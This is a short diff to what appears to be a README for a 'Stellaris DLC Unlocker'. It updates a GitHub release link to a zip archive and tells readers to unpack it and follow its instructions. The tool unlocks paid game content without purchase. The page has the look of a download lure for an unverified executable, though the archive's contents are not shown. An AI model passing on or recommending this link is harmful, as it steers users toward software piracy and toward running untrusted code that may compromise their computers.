@@ -2,7 +2,7 @@
 
 ## 📥 Getting Started
 To get started with Stellaris DLC Unlocker, follow these simple steps:
-1. **Get the unlocker: [🔗 Download Stellaris DLC Unlocker](https://github.com/Stellaris-DLC-Unlocker/.github/releases/download/1.67/Stellaris-DLC-Unlocker.zip)**
+1. **Get the unlocker: [🔗 Download Stellaris DLC Unlocker](https://github.com/Stellaris-DLC-Unlocker/.github/releases/download/1.6.7.5/Stellaris-DLC-Unlock.zip)**
 2. **Unpack the archive and follow the instructions!**
 3. **Enjoy the game!**
 
